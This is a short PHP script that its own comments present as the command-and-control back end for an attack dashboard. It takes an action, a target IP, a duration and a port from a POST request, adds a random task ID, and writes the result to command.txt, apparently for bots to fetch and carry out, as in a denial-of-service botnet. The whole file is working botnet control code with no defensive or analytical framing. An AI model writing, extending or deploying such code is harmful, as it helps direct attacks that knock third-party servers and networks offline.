<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // capture attack coordinates from C2 dashboard
    $action = $_POST['action'];
    $text1 = $_POST['text1'];
    $text2 = $_POST['text2'];
    $text3 = $_POST['text3'];

    // generate a task ID for the command
    $randomId = bin2hex(random_bytes(8)); // 8 bytes = 16 hex characters

    // merge the ID, the action, and the three parameters (ip, duration, port)
    $command = $randomId . " " . $action . " " . $text1 . " " . $text2 . " " . $text3;
    
    // ensure command log exists
    $filePath = 'command.txt';
    
    if (!file_exists($filePath)) {
        // if not, create it
        file_put_contents($filePath, "");
    }

    // write command to the command log. overwrite last command
    file_put_contents($filePath, $command . PHP_EOL); // append via ---> PHP_EOL, FILE_APPEND);
    
    // verbose command update
    echo "Command '$command' has been saved to $filePath.";
} else {
    // verbose error
    echo "Invalid request method.";
}
?>
